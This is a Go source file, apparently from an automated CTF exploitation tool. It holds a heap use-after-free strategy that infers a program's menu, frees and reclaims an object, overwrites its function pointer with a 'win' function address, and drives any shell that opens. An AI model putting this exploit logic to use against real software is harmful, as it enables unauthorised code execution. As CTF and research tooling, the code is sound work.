package solve

import (
	"context"
	"regexp"
	"strconv"
	"strings"

	"github.com/MoriartyPuth/PwnProbes/internal/runner"
)

// Heap support, first increment. This handles one common, no-leak heap bug: a
// use-after-free where a freed object is reclaimed by a same-size allocation,
// letting us overwrite an in-binary function pointer with a win function, which a
// later "use" action calls. It drives a conventional numbered menu inferred by
// keyword. It does NOT yet cover tcache poisoning, libc-hook overwrites (which
// need a leak), size-prompted allocators, or non-numeric menus - those are the
// rest of the heap roadmap.

var menuLineRe = regexp.MustCompile(`(?m)^\s*(\d+)\s*[\.\)\:\-]\s*([A-Za-z][\w ]*)`)

type heapMenu struct {
	create, del, use, reclaim int
}

func keywordOption(labels map[int]string, kws ...string) int {
	for num, label := range labels {
		l := strings.ToLower(label)
		for _, k := range kws {
			if strings.Contains(l, k) {
				return num
			}
		}
	}
	return -1
}

// inferMenu reads the menu banner and maps the four actions the UAF chain needs.
// reclaim must be an allocation that writes raw bytes WITHOUT resetting the
// object (so "create"/"add" are excluded from it).
func inferMenu(text string) (heapMenu, bool) {
	labels := map[int]string{}
	for _, m := range menuLineRe.FindAllStringSubmatch(text, -1) {
		n, err := strconv.Atoi(m[1])
		if err == nil {
			labels[n] = strings.TrimSpace(m[2])
		}
	}
	m := heapMenu{
		create:  keywordOption(labels, "create", "alloc", "add", "new", "malloc"),
		del:     keywordOption(labels, "delete", "free", "remove", "del"),
		use:     keywordOption(labels, "use", "call", "run", "trigger", "exec", "print", "show", "view"),
		reclaim: keywordOption(labels, "stash", "edit", "write", "fill", "store", "update", "modify"),
	}
	ok := m.create >= 0 && m.del >= 0 && m.use >= 0 && m.reclaim >= 0
	return m, ok
}

// heapUAFStrategy infers the menu and tries the UAF reclaim-and-overwrite chain
// for each candidate function-pointer offset in the object.
func (s *solver) heapUAFStrategy(ctx context.Context) (bool, error) {
	bin := s.report.Binary
	if bin.Bits != 64 || bin.Protections["pie"].Status == "enabled" {
		return false, nil
	}
	hasMalloc, hasFree := false, false
	for _, imp := range bin.Imports {
		switch imp {
		case "malloc", "calloc", "realloc":
			hasMalloc = true
		case "free":
			hasFree = true
		}
	}
	if !hasMalloc || !hasFree {
		return false, nil
	}
	wins := orderedWinFunctions(bin)
	if len(wins) == 0 {
		return false, nil
	}
	win := wins[0].addr

	// Infer the menu once.
	conn, cleanup, err := s.open(ctx)
	if err != nil {
		return false, err
	}
	banner := string(conn.RecvUntilIdle(s.idle()))
	conn.Close()
	cleanup()
	menu, ok := inferMenu(banner)
	if !ok {
		s.report.Limitations = append(s.report.Limitations, "no conventional create/free/use/edit menu inferred; heap UAF strategy skipped")
		return false, nil
	}

	for _, fnOff := range []int{0, 8, 16} {
		if err := ctx.Err(); err != nil {
			return false, err
		}
		done, err := s.heapUAFAttempt(ctx, menu, win, fnOff)
		if err != nil || done {
			return done, err
		}
	}
	return false, nil
}

func (s *solver) heapUAFAttempt(ctx context.Context, m heapMenu, win uint64, fnOff int) (bool, error) {
	conn, cleanup, err := s.open(ctx)
	if err != nil {
		return false, err
	}
	defer cleanup()
	defer conn.Close()

	var tr strings.Builder
	act := func(choice int, inputs [][]byte) {
		tr.WriteString(string(conn.RecvUntilIdle(s.idle()))) // menu / prompt
		_ = conn.Send([]byte(strconv.Itoa(choice) + "\n"))
		for _, in := range inputs {
			tr.WriteString(string(conn.RecvUntilIdle(s.idle()))) // sub-prompt
			_ = conn.Send(in)
		}
	}

	data := make([]byte, 32)
	for i := fnOff; i < fnOff+8 && i < len(data); i++ {
		data[i] = byte(win >> (8 * (i - fnOff)))
	}

	act(m.create, [][]byte{[]byte("AAAA\n")}) // allocate obj 0 (fn = default)
	act(m.del, [][]byte{[]byte("0\n")})       // free obj 0 (UAF)
	act(m.reclaim, [][]byte{data})            // reclaim chunk, overwrite fn with win
	act(m.use, [][]byte{[]byte("0\n")})       // call obj 0's fn == win
	tr.WriteString(string(conn.RecvUntilIdle(s.idle())))
	_ = conn.Send([]byte(driveShell)) // in case win spawns a shell
	tr.WriteString(string(conn.RecvUntilIdle(s.idle())))

	out := tr.String()
	cands := s.ex.Find(out, []byte("heap-uaf-marker"), "session")
	note := "heap UAF fn-ptr overwrite, fn_offset=" + strconv.Itoa(fnOff)
	return s.finalize("heap_uaf", note, data, runner.Result{Outcome: "session", ExitCode: -1, Stdout: out}, cands), nil
}
